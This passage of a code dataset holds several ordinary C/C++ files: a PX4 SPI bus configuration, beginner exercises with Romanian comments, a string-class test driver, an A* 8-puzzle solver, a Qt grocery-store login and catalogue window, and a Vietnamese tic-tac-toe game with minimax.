{GPIO::PortG, GPIO::Pin8}),\n\t\t// initSPIBus(SPI::Bus::SPI5, {\n\t\t// \tinitSPIDevice(SPIDEV_FLASH(0), SPI::CS{GPIO::PortG, GPIO::Pin7})\n\t\t// }),\n\t\tinitSPIBus(SPI::Bus::SPI6, {\n\t\t\tinitSPIDevice(DRV_DEVTYPE_UNUSED, SPI::CS{GPIO::PortI, GPIO::Pin10}, SPI::DRDY{GPIO::PortD, GPIO::Pin11})\n\t\t}),\n\t}),\n\tinitSPIFmumID(ARKPI6X_1, { // Placeholder\n\t\tinitSPIBus(SPI::Bus::SPI1, {\n\t\t\tinitSPIDevice(DRV_IMU_DEVTYPE_ICM42688P, SPI::CS{GPIO::PortI, GPIO::Pin9}, SPI::DRDY{GPIO::PortF, GPIO::Pin2}),\n\t\t}, {GPIO::PortI, GPIO::Pin11}),\n\t\tinitSPIBus(SPI::Bus::SPI2, {\n\t\t\tinitSPIDevice(DRV_IMU_DEVTYPE_ICM42688P, SPI::CS{GPIO::PortH, GPIO::Pin5}, SPI::DRDY{GPIO::PortA, GPIO::Pin10}),\n\t\t}),\n\t\tinitSPIBus(SPI::Bus::SPI3, {\n\t\t\tinitSPIDevice(DRV_FLOW_DEVTYPE_PAW3902, SPI::CS{GPIO::PortI, GPIO::Pin4}, SPI::DRDY{GPIO::PortI, GPIO::Pin6}),\n\t\t}),\n\t\t//  initSPIBus(SPI::Bus::SPI4, {\n\t\t//    // no devices\n\t\t// TODO: if enabled, remove GPIO_VDD_3V3_SENSORS4_EN from board_config.h\n\t\t//  }, {GPIO::PortG, GPIO::Pin8}),\n\t\t// initSPIBus(SPI::Bus::SPI5, {\n\t\t// \tinitSPIDevice(SPIDEV_FLASH(0), SPI::CS{GPIO::PortG, GPIO::Pin7})\n\t\t// }),\n\t\tinitSPIBus(SPI::Bus::SPI6, {\n\t\t\tinitSPIDevice(DRV_DEVTYPE_UNUSED, SPI::CS{GPIO::PortI, GPIO::Pin10}, SPI::DRDY{GPIO::PortD, GPIO::Pin11})\n\t\t}),\n\t}),\n};\n\nstatic constexpr bool unused = validateSPIConfig(px4_spi_buses_all_hw);\n",
    "\ufeff#include \"HFolder.h\"\n\nvoid CE_LOOP_TEXT_(int intLocalTimes_,std::string sLocalText)\n{\n\tfor (int i = 0; i < intLocalTimes_; i++) {\n\t\tstd::cout << sLocalText << std::endl;\n\t}\n\n}\n\nbool CE_CURS_WHILE()\n{\n\n\tstd::cout << \"Mai acceleram? :\" << \" Da (1) \" << \"Nu (2)\" << std::endl;\n\n\tint input;\n\tstd:: cin >> input;\n\tbool rezultat;\n\n\tswitch (input) {\n\tcase 1:\n\t\trezultat = true;\n\t\tbreak;\n\tcase 2:\n\t\trezultat = false;\n\t\tbreak;\n\tdefault:\n\t\trezultat = false;\n\t\tbreak;\n\t}\n\treturn rezultat;\n\n}\n\nvoid CE_THROTTLE_()\n{\n\twhile (CE_CURS_WHILE()) {\n\t\tstd::cout << \" SPEEEEEED\" << std::endl;\n\t}\n}\n\nvoid CE_CURS_DO_WHILE_()\n{\n\n\tdo \n\t{\n\t\tstd::cout << \" Do this \" << std::endl;\n\t} while (false);\n\n}\n\n\n// TEME // \n\n\nvoid CE_TEMA_01_(int intLocalTimer)\n{\n\tfor (int i = intLocalTimer; i > 0; i--)\n\t{\n\t\tstd::cout << i << std::endl;\n\t\tstd::this_thread::sleep_for(std::chrono::seconds(1));\n\t\tif (i == 1) {\n\t\t\tstd::cout << \"Lansare!\" << std::endl;\n\t\t}\n\t}\n}\n\nvoid CE_TEMA_02_(int intLocalNumber)\n{\n\tint intRezultat_ = 0;\n\n\tfor (int i = 1; i <= intLocalNumber; i++)\n\t{\n\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(75));\n\t\tstd::cout << i;\n\n\t\tintRezultat_ = intRezultat_ + i;\n\n\t\tif (i == intLocalNumber) {\n\t\t\tstd::cout << \" = \" << intRezultat_ << std::endl;\n\t\t}\n\t\telse {\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(75));\n\t\t\tstd::cout << \" + \";\n\t\t}\n\t}\n}\n\nvoid CE_TEMA_03_(int intLocalLines)\n{\n\tfor (int i = 1; i <= intLocalLines; i++)\n\t{\n\t\t// Afiseaza spatiile pentru aliniere \u00een partea stanga\n\t\tfor (int s = 0; s < intLocalLines - i; s++) {\n\t\t\tstd::cout << \"  \";\n\t\t}\n\n\t\t// Afiseaza stelele pentru partea stanga a piramidei\n\t\tfor (int k = 0; k < i; k++) {\n\t\t\tstd::cout << \"* \";\n\t\t}\n\n\t\t// Afiseaza stelele pentru partea dreapta a piramidei\n\t\tfor (int k = i - 2; k >= 0; k--) {\n\t\t\tstd::cout << \"* \";\n\t\t}\n\t\tstd::cout << std::endl;\n\t}\n}\n\nint CE_TEMA_04_(int intLocalA, int intLocalB)\n{\n\t\tint intLocalC;\n\n\t\twhile (intLocalB)\n\t\t{\n\t\t\tintLocalC = intLocalA % intLocalB;\n\t\t\tintLocalA = intLocalB;\n\t\t\tintLocalB = intLocalC;\n\t\t}\n\t\treturn intLocalA;\n}\n\nbool CE_CHECK_PRIME_NUM_(int intLocalNumber) {\n\tif (intLocalNumber <= 1) {\n\t\treturn false;  // Numerele mai mici sau egale cu 1 nu sunt prime\n\t}\n\n\tint i = 2;\n\twhile (i * i <= intLocalNumber) {\n\t\tif (intLocalNumber % i == 0) {\n\t\t\treturn false;  // Daca gasim un divizor, numarul nu este prim\n\t\t}\n\t\t++i;\n\t}\n\n\treturn true;  // Daca nu gasim divizori, numarul este prim\n}\n\nvoid CE_TEMA_05_()\n{\n\tint intNumarAles = 0;\n\tstd::cout << \"Introduceti un numar: \";\n\tstd::cin >> intNumarAles;\n\tstd::cout << std::endl;\n\t\n\tif (CE_CHECK_PRIME_NUM_(intNumarAles)) {\n\t\tstd::cout << intNumarAles << \" este un numar prim\" << std::endl;\n\t}\n\telse {\n\t\tstd::cout << intNumarAles << \" nu este un numar prim\" << std::endl;\n\t}\n\n}\n\nvoid CE_TEMA_06_()\n{\n\tint intNumarDecimal = 0;\n\n\t// Citim num\u0103rul \u00een sistemul decimal de la utilizator\n\tstd::cout << \"Introduceti un numar in sistemul decimal: \";\n\tstd::cin >> intNumarDecimal;\n\n\t// Verificam cazul particular pentru numarul 0\n\tif (intNumarDecimal == 0) {\n\t\tstd::cout << \"Reprezentarea binara a numarului 0 este: 0\" << std::endl;\n\t}\n\telse {\n\t\t// Convertim numarul in sistemul binar utiliz\u00e2nd o bucla while\n\t\tstd::bitset<32> bitiBinary;  // Folosim 32 de biti pentru a acoperi un int standard\n\t\tint index = 0;\n\n\t\twhile (intNumarDecimal > 0) {\n\t\t\tbitiBinary[index] = intNumarDecimal % 2;\n\t\t\tintNumarDecimal /= 2;\n\t\t\t++index;\n\t\t}\n\n\t\t// Afisam rezultatul\n\t\tstd::cout << \"Reprezentarea binara a numarului este: \";\n\n\t\t// Afisam bitii in ordine inversa, de la cel mai semnificativ la cel mai putin semnificativ\n\t\tfor (int i = index - 1; i >= 0; --i) {\n\t\t\tstd::cout << bitiBinary[i];\n\t\t}\n\t}\n\tstd::cout << std::endl;\n}\n\n\nbool CE_CHECK_MAGIC_NUMBER_(int intLocalMagicNumber, int intLocalAINumber)\n{\n\tif (intLocalMagicNumber == intLocalAINumber) {\n\t\tstd::cout << \"Bravo ai gasit numarul magic !\" << std::endl;\n\t\treturn false;\n\t} else {\n\t\tstd::cout << \"Mai incearca, numarul nu este \" << intLocalMagicNumber << std::endl;\n\t\treturn true;\n\t}\n}\n\nvoid CE_TEMA_07_()\n{\n\tint intUserNumber = 0;\n\tint intUserTryes = 0;\n\tstd::random_device rd;\n\tstd::uniform_int_distribution<int> distribution(1, 3);\n\tunsigned short intAIChoice = distribution(rd);\n\n\tdo\n\t{\n\t\tstd::cout << \"Introdu numarul: \";\n\t\tstd::cin >> intUserNumber;\n\t\tstd::cout << std::endl;\n\t\tintUserTryes++;\n\t}\n\twhile (CE_CHECK_MAGIC_NUMBER_(intUserNumber, intAIChoice));\n\t\n\n\tstd::cout << \"Numarul era \" << intAIChoice << \", incercari: \" << intUserTryes << std::endl;\n}\n\nvoid CE_TEMA_08_()\n{\n\tchar cContinua;\n\tfloat fNumar1, fNumar2;\n\tchar cOperator;\n\n\tdo {\n\t\t// Citirea numerelor \u0219i a operatorului\n\t\tstd::cout << \"Introduceti primul numar: \";\n\t\tstd::cin >> fNumar1;\n\n\t\tstd::cout << \"Introduceti al doilea numar: \";\n\t\tstd::cin >> fNumar2;\n\n\t\tstd::cout << \"Introduceti operatorul (+, -, *, /): \";\n\t\tstd::cin >> cOperator;\n\n\t\t// Calculul si afisarea rezultatului\n\t\tswitch (cOperator) {\n\t\tcase '+':\n\t\t\tstd::cout << fNumar1 <<\" + \" << fNumar2 << \" = \" << fNumar1 + fNumar2 << std::endl;\n\t\t\tbreak;\n\t\tcase '-':\n\t\t\tstd::",
    "/*\n * Name: Grant Johnson, Ethan Sychangco\n * Email: Gmjohnson@scu.edu, Esychangco@scu.edu\n */\n\n#include <iostream>\n#include \"mystring.h\"\n\nusing namespace lab5GE;\n\nint main(){\n    // TEST CONSTRUCTOR by initializing three strings in 3 different ways\n    std::cout << \"\\n[Testing Constructor]\" << std::endl;\n    string s1; // default constructor\n    string s2('s'); // char constructor\n    string s3(\"Hello, World!\"); // string constructor\n\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"s2: \" << s2 << std::endl;\n    std::cout << \"s3: \" << s3 << std::endl;\n\n\n    // TEST += operator\n    std::cout << \"\\n[Testing +=]\" << std::endl;\n\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1 += 'A';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'B';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'C';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n\n\n    // TEST [] operator\n    std::cout << \"\\n[Testing []]\" << std::endl;\n\n    std::cout << \"s1[0]: \" << s1[0] << std::endl;\n    std::cout << \"s1[1]: \" << s1[1] << std::endl;\n    std::cout << \"s1[2]: \" << s1[2] << std::endl;\n\n\n    // TEST == operator\n    std::cout << \"\\n[Testing =]\" << std::endl;\n\n    std::cout << \"s3 before s3 = s1: \" << s3 << std::endl;\n    s3 = s1;\n    std::cout << \"s3 after s3 = s1: \" << s3 << std::endl;\n    std::cout << \"s2 before s2 = s2: \" << s2 << std::endl;\n    s2 = s2;\n    std::cout << \"s2 after s2 = s2: \" << s2 << std::endl;\n\n\n    // TEST COMPARISON operators\n    std::cout << \"\\n[Testing Comparisons]\" << std::endl;\n    string A('A');\n    string B('B');\n\n    std::cout << \"A == A: \" << (A == A) << std::endl;\n    std::cout << \"A == B: \" << (A == B) << std::endl;\n    std::cout << \"A != A: \" << (A != A) << std::endl;\n    std::cout << \"A != B: \" << (A != B) << std::endl;\n    std::cout << \"A > A: \" << (A > A) << std::endl;\n    std::cout << \"A > B: \" << (A > B) << std::endl;\n    std::cout << \"B > A: \" << (B > A) << std::endl;\n    std::cout << \"A >= A: \" << (A >= A) << std::endl;\n    std::cout << \"A >= B: \" << (A >= B) << std::endl;\n    std::cout << \"B >= A: \" << (B >= A) << std::endl;\n    std::cout << \"A < A: \" << (A < A) << std::endl;\n    std::cout << \"A < B: \" << (A < B) << std::endl;\n    std::cout << \"B < A: \" << (B < A) << std::endl;\n    std::cout << \"A <= A: \" << (A <= A) << std::endl;\n    std::cout << \"A <= B: \" << (A <= B) << std::endl;\n    std::cout << \"B <= A: \" << (B <= A) << std::endl;;\n\n    \n    // TEST OUTPUT operator\n    string input;\n    std::cout << \"\\n[Testing <<]\" << std::endl;\n    std::cout << \"Please enter a word: \";\n    std::cin >> input;\n    std::cout << \"You entered: \" << input << std::endl;\n\n\n    // TEST INSERT function\n    // s1 should be \"ABC\" at this point\n    std::cout << \"\\n[Testing insert()]\" << std::endl;\n    string sinsert1 = string(\"Strings like \");\n    string sinsert2 = string(\" are **~very~** epic.\");\n\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(string('D'), 3); // <?> INDEX IS 3 OR 4???\n    std::cout << \"-> Insert 'D' at pos 3 \" << std::endl; \n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert1, 0);\n    std::cout << \"-> Insert \\\"\" << sinsert1 << \"\\\" at pos 0 \" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert2, 17);\n    std::cout << \"-> Insert \\\"\" << sinsert2 << \"\\\" at pos 17 \" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n\n\n    // TEST DELETE function\n    // s1 should be \"Strings like ABCD are **~very~** epic.\" at this point\n    std::cout << \"\\n[Testing dlt()]\" << std::endl;\n    std::cout << \"s1: \" << s1  << std::endl; \n    s1.dlt(8, 10);\n    std::cout << \"-> Delete 10 chars starting at pos 8\" << std::endl;     \n    std::cout << \"s1: \" << s1  << std::endl; \n\n\n    // TEST REPLACE function\n    std::cout << \"\\n[Testing replace()]\" << std::endl;\n    string s4 = string(\"abc\");\n    string srep1 = string('y');\n    string srep2 = string(\"z\");\n    string srep3 = string(\"123\");\n\n    std::cout << \"s4: \" << s4 << std::endl; \n    s4.replace('x', 0);\n    std::cout << \"-> Replace with 'x' at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep1, 1);\n    std::cout << \"-> Replace with string '\" << srep1 << \"' at pos 1 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep2, 2);\n    std::cout << \"-> Replace with string \\\"\" << srep2 << \"\\\" at pos 2 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep3, 0);\n    std::cout << \"-> Replace with string \\\"\" << srep3 << \"\\\" at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n\n\n    // TEST COUNT function\n    std::cout << \"\\n[Testing count()]\" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"'a' in s1: \" << s1.count('a') << std::endl;\n   ",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n#define N 3\r\nstruct Node\r\n{\r\n    Node *parent;\r\n    int mat[N][N];\r\n    int x, y;\r\n    int cost;\r\n    int level;\r\n};\r\nvoid printMatrix(int mat[N][N])\r\n{\r\n    for (int i = 0; i < N; i++)\r\n    {\r\n        for (int j = 0; j < N; j++)\r\n            printf(\"%d \", mat[i][j]);\r\n        printf(\"\\n\");\r\n    }\r\n}\r\nNode *newNode(int mat[N][N], int x, int y, int newX, int newY, int level, Node *parent)\r\n{\r\n    Node *node = new Node;\r\n    node->parent = parent;\r\n    memcpy(node->mat, mat, sizeof node->mat);\r\n    swap(node->mat[x][y], node->mat[newX][newY]);\r\n    node->cost = INT_MAX;\r\n    node->level = level;\r\n    node->x = newX;\r\n    node->y = newY;\r\n    return node;\r\n}\r\nint row[] = {1, 0, -1, 0};\r\nint col[] = {0, -1, 0, 1};\r\nint calculateCost(int initial[N][N], int final[N][N])\r\n{\r\n    int count = 0;\r\n    for (int i = 0; i < N; i++)\r\n        for (int j = 0; j < N; j++)\r\n            if (initial[i][j] && initial[i][j] != final[i][j])\r\n                count++;\r\n    return count;\r\n}\r\nint isSafe(int x, int y)\r\n{\r\n    return (x >= 0 && x < N && y >= 0 && y < N);\r\n}\r\nvoid printPath(Node *root)\r\n{\r\n    if (root == NULL)\r\n        return;\r\n    printPath(root->parent);\r\n    printMatrix(root->mat);\r\n    cout << \"hscore:\" << root->cost << \"\\ngscore:\" << root->level << \"\\nfscore:\" << root->cost + root->level << \"\\n\";\r\n    printf(\"\\n\");\r\n}\r\nstruct comp\r\n{\r\n    bool operator()(const Node *lhs, const Node *rhs) const\r\n    {\r\n        return (lhs->cost + lhs->level) > (rhs->cost + rhs->level);\r\n    }\r\n};\r\nvoid solve(int initial[N][N], int x, int y, int final[N][N])\r\n{\r\n    priority_queue<Node *, std::vector<Node *>, comp> pq;\r\n    Node *root = newNode(initial, x, y, x, y, 0, NULL);\r\n    root->cost = calculateCost(initial, final);\r\n    pq.push(root);\r\n    while (!pq.empty())\r\n    {\r\n        Node *min = pq.top();\r\n        pq.pop();\r\n        if (min->cost == 0)\r\n        {\r\n            printPath(min);\r\n            return;\r\n        }\r\n        for (int i = 0; i < 4; i++)\r\n        {\r\n            if (isSafe(min->x + row[i], min->y + col[i]))\r\n            {\r\n                Node *child = newNode(min->mat, min->x, min->y, min->x + row[i], min->y + col[i], min->level + 1, min);\r\n                child->cost = calculateCost(child->mat, final);\r\n                pq.push(child);\r\n            }\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    int initial[3][3];\r\n    int x, y;\r\n    cout << \"Enter Initial Block Structure\\nEnter 0 for blank space:\\n\";\r\n    for (int i = 0; i < 3; i++)\r\n    {\r\n        for (int j = 0; j < 3; j++)\r\n        {\r\n            cout << \"Row \" << i + 1 << \" Column \" << j + 1 << \" Element = \";\r\n            cin >> initial[i][j];\r\n            if (initial[i][j] == 0)\r\n            {\r\n                x = i;\r\n                y = j;\r\n            }\r\n        }\r\n    }\r\n    int final[3][3];\r\n    cout << \"\\n\\nEnter Final Block Structure\\nEnter 0 for blank space:\\n\";\r\n    for (int i = 0; i < 3; i++)\r\n    {\r\n        for (int j = 0; j < 3; j++)\r\n        {\r\n            cout << \"Row \" << i + 1 << \" Column \" << j + 1 << \" Element = \";\r\n            cin >> final[i][j];\r\n        }\r\n    }\r\n    cout << \"\\n\\nThis is the solution using A * Algorithm:\\n\\n\";\r\n    solve(initial, x, y, final);\r\n    return 0;\r\n}",
    "#include \"mainwindow.h\"\n#include \"checkout.h\"\n#include \"qstandardpaths.h\"\n#include \"ui_mainwindow.h\"\n#include \"registrationwindow.h\"\n#include \"userwindow.h\"\n#include \"add_item_window.h\"\n#include <QPixmap>\n#include <QFile>\n#include <items.h>\n#include <shelf.h>\n#include \"cartwindow.h\"\n#include \"manageproducts.h\"\n#include \"checkout.h\"\n\nQStringList userDetails;\nQString MainWindow::username;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    QPixmap pix(\":/logo image.png\");\n    ui->logo->setPixmap(pix.scaled(100,100,Qt::KeepAspectRatio));\n    ui->manageProductsBtn->hide();\n    ui->manageUsersBtn->hide();\n    ui->incorrect_login->hide();\n    ui->delete_prod_button->hide();\n    ui->cart->hide();\n    ui->checkout->hide();\n    readProductsFromFile();\n    loggedIn=false;\n    cart_empty=false;\n    setButtonNames(this);\n    Item::printitems();\n\n\n    ///////setting up button presses\n    for (int row = 0; row < 5; ++row) {\n        for (int col = 0; col < 7; ++col) {\n            QString buttonName = \"p\" + QString::number(row) + QString::number(col); // Button name format\n            QPushButton *button = this->findChild<QPushButton*>(buttonName); // Find the button by name\n            if (button) {\n                connect(button, &QPushButton::clicked, this, &MainWindow::handleButtonClick);\n            }\n        }\n    }\n\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::on_signup_clicked()\n{\n    Registrationwindow* registrationwindow=new Registrationwindow;\n    registrationwindow->show();\n}\n\n\nvoid MainWindow::on_loginButton_clicked()\n{\n    qDebug() << QStandardPaths::writableLocation(QStandardPaths::DesktopLocation);\n    QString username = ui->userNameBox->text();\n    QString password = ui->passwordBox->text();\n\n    if (username.isEmpty() || password.isEmpty()) {\n        ui->incorrect_login->show();\n        return;\n    }\n\n    // Get the desktop directory path\n    QString desktopDir = QStandardPaths::writableLocation(QStandardPaths::DesktopLocation);\n\n    // Create the full file path\n    QString filePath = desktopDir + \"/users.txt\";\n\n    QFile file(filePath);\n    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        qDebug() << \"Failed to open users.txt for reading:\" << file.errorString();\n        return;\n    }\n\n    QTextStream in(&file);\n    QString line;\n    bool loggedIn = false;\n\n    while (!(line = in.readLine()).isNull()) {\n        QStringList fields = line.split(',');\n\n        QString csvUsername = fields[0].trimmed();\n        QString csvPassword = fields[1].trimmed();\n        QString User = fields[2].trimmed(); // Assuming user type is stored in the third field\n\n        if (csvUsername == username && csvPassword == password) {\n            loggedIn = true;\n            userDetails = fields;\n            if (User == \"TRUE\") {\n                ui->manageProductsBtn->show();\n                ui->manageUsersBtn->show();\n                ui->delete_prod_button->show();\n            } else {\n                ui->cart->show();\n                ui->checkout->show();\n            }\n            break;\n        }\n    }\n\n    file.close();\n\n    if (loggedIn) {\n        ui->incorrect_login->hide();\n        qDebug() << \"Logged in successfully!\";\n        ui->userNameBox->deleteLater();\n        ui->passwordBox->deleteLater();\n        ui->loginButton->deleteLater();\n        ui->label_2->deleteLater();\n        ui->signup->deleteLater();\n        this->username=username;\n        ui->helloLabel->setText(\"Hello \" + username);\n    } else {\n        ui->incorrect_login->show();\n        qDebug() << \"Incorrect username or password\";\n    }\n}\n\n\nvoid MainWindow::on_manageProductsBtn_clicked()\n{\n    Add_Item_Window* itemWindow=new Add_Item_Window;\n    itemWindow->show();\n\n}\n\n\nvoid MainWindow::on_manageUsersBtn_clicked()\n{\n    userWindow* user_window=new userWindow;\n    user_window->show();\n\n}\n\nvoid MainWindow::on_sort_clicked()\n{\n\n    sort_type=ui->sort_type->currentText();\n    //Item::items.clear();\n    //readProductsFromFile();\n\n    if(sort_type==\"price\")\n        Item::sort_by_price();\n    if(sort_type==\"brand\")\n        Item::sort_by_brand();\n    if(sort_type==\"name\")\n        Item::sort_by_name();\n\n    Item::printitems();\n     setButtonNames(this);\n\n\n}\n\n\n//////sorting by categories\n\nvoid MainWindow::on_fruit_category_clicked()\n{\n    Item::fruit();\n}\n\n\nvoid MainWindow::on_meat_category_clicked()\n{\n\n\n    Item::meat();\n\n}\n\n\nvoid MainWindow::on_dairy_category_clicked()\n{\n\n    Item::dairy();\n}\n\n\nvoid MainWindow::on_grains_category_clicked()\n{\n\n    Item::grain();\n}\n\n\nvoid MainWindow::on_desert_category_clicked()\n{\n\n    Item::desert();\n}\n\n\nvoid MainWindow::on_frozen_category_clicked()\n{\n\n    Item::frozen();\n}\n\n\nvoid MainWindow::on_drinks_category_clicked()\n{\n    Item::drinks();\n}\n\n\nvoid MainWindow::on_all_categories_clicked()\n{\n    Item::items.clear();\n    readProductsFromFile();\n}\n\nint getText(QString productName) {\n    // Open the file\n    QString desktopDir = Q",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <exception>\n#include <sstream>\n#include <ctime>\n\n#define LIGHT_RED \"\\033[91m\";\n#define BLUE \"\\033[36m\";\n#define RESET_COLOR \"\\033[0m\";\nconst int SZ = 3;\n\nusing namespace std;\n\nclass Board {\n\tvector<char> b;\npublic:\n\tBoard() : b(SZ*SZ, ' ') {}\n\t~Board() {}\n\tBoard(const Board& board) : b(board.b) {}\n\n\tvoid display(int cell1 = -1, int cell2 = -1, int cell3 = -1) {\n\t\tcout << \"-------------\\n\";\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tcout << \"| \";\n\t\t\tfor (int j = 0; j < SZ; j++) {\n\t\t\t\tif (cell1 == -9) cout << BLUE;\n\t\t\t\tif (i * SZ + j == cell1 - 1 || i * SZ + j == cell2 - 1 || i * SZ + j == cell3 - 1) cout << LIGHT_RED;\n\t\t\t\tcout << b[i * SZ + j] << RESET_COLOR;\n\t\t\t\tcout << \" | \";\n\t\t\t}\n\t\t\tcout << \"\\n-------------\\n\";\n\t\t}\n\t}\n\tbool cellEmpty(int cell) {\n\t\tif (b[cell - 1] == ' ') return true;\n\t\treturn false;\n\t}\n\tbool checkFull() {\n\t\tfor (int i = 0; i < 9; i++) if (b[i] == ' ') return false;\n\t\treturn true;\n\t}\n\tbool checkWin(char symbol) {\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) return true;\n\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) return true;\n\t\t}\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) return true;\n\t\tif (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) return true;\n\t\treturn false;\n\t}\n\tvoid makeMove(int cell, char symbol) {\n\t\tb[cell - 1] = symbol;\n\t}\n\tvector<int> availableMoves() {\n\t\tvector<int> v;\n\t\tfor (int i = 1; i < 10; i++) if (cellEmpty(i)) v.push_back(i);\n\t\treturn v;\n\t}\n\tvoid displayWin(char symbol) {\n\t\tint c1, c2, c3;\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) { c1 = 0; c2 = 4; c3 = 8; }\n\t\telse if (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) { c1 = 2; c2 = 4; c3 = 6; }\n\t\telse \n\t\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) { c1 = i; c2 = i + 3; c3 = i + 6; }\n\t\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) { c1 = i * 3; c2 = i * 3 + 1; c3 = i * 3 + 2; }\n\t\t\t}\n\t\tc1++; c2++; c3++;\n\t\tdisplay(c1, c2, c3);\n\t}\n};\n\nclass Player {\n\tchar symbol;\npublic:\n\tPlayer(char s) : symbol(s) {}\n\tvirtual ~Player(){}\n\tPlayer(const Player& p) :symbol(p.symbol) {}\n\tvirtual Player* clone() const = 0;\n\n\tchar getSymbol() { return symbol; }\n\tvirtual void move(Board &b) = 0;\n};\n\nclass Human : public Player {\npublic:\n\tHuman(char s) : Player(s) {}\n\t~Human() {}\n\tHuman(const Human& h) :Player(h) {}\n\tPlayer* clone() const { return new Human(*this); }\n\n\tvoid move(Board& b) {\n\t\tcout << \"\\nNguoi choi \" << getSymbol() << \" chon vi tri danh (1-9): \";\n\t\tstring s; cin >> s;\n\t\tstringstream ss(s);\n\t\tint cell; ss >> cell;\n\t\ttry {\n\t\t\tif (cell < 1 || cell>9) throw out_of_range(\"-O khong hop le!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse if (!b.cellEmpty(cell)) throw invalid_argument(\"-O da duoc chon!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse {\n\t\t\t\tb.makeMove(cell, getSymbol());\n\t\t\t\tb.display(cell);\n\t\t\t}\n\t\t}\n\t\tcatch (out_of_range& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t\tcatch (invalid_argument& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t}\n};\n\nclass Computer : public Player {\n\tchar OSymbol;\n\n\tint minimax(Board b, int d, bool mp, char self, char opponent) {\n\t\tif (b.checkWin(self)) return 1;\n\t\tif (b.checkWin(opponent)) return -1;\n\t\tif (b.checkFull() || d == 0) return 0;\n\n\t\tvector<int> moves = b.availableMoves();\n\n\t\tif (mp) {\n\t\t\tint score = -10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, self);\n\t\t\t\tscore = max(score, minimax(b, d - 1, false, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t\telse {\n\t\t\tint score = 10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, opponent);\n\t\t\t\tscore = min(score, minimax(b, d - 1, true, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t}\npublic:\n\tComputer(char s) :Player(s), OSymbol(' ') {}\n\t~Computer() {}\n\tComputer(const Computer& c) :Player(c), OSymbol(c.OSymbol) {}\n\tPlayer* clone() const { return new Computer(*this); }\n\n\tvoid setOSymbol(char s) { OSymbol = s; }\n\tint getBestMove(Board b, char self, char opponent) {\n\t\tint bestScore = -10, bestMove = -10;\n\n\t\tvector<int> moves = b.availableMoves();\n\t\tfor (int move : moves) {\n\t\t\tb.makeMove(move, self);\n\t\t\tint score = minimax(b, 5, false, self, opponent);\n\t\t\tb.makeMove(move, ' ');\n\t\t\tif (score > bestScore) {\n\t\t\t\tbestScore = score;\n\t\t\t\tbestMove = move;\n\t\t\t}\n\t\t}\n\t\treturn bestMove;\n\t}\n\tvoid move(Board& b) {\n\t\tint cell = getBestMove(b, getSymbol(), OSymbol);\n\t\tb.makeMove(cell, getSymbol());\n\t\tcout << \"\\nNguoi may \" << getSymbol() << \": \" << cell << endl;\n\t\tb.display(cell);\n\t}\n};\n\nclass Game {\n\tBoard b;\n\tPlayer* p1, * p2;\npublic:\n\tGame() :p1(NULL), p2(NULL) {}\n\t~Game() { delete p1; delete p2; }\n\tGame(const Game& g) : b(g.b), p1(NULL), p2(NULL) {\n\t\tif (g.p1) p1 = g.p1->clone();\n\t\tif (g.p2) p2 = g.p2->clone();\n\t}\n\n\tvoid start() {\n\t\tcout << \"Chao mung den voi Tro choi Tic Tac Toe!\\n\";\n\t\tcout << \"Ban co the nhap vi tri cua o ma ban muon danh.\\n\";\n\t\tcout << \"Vi tri tu 1 den 9 duoc",
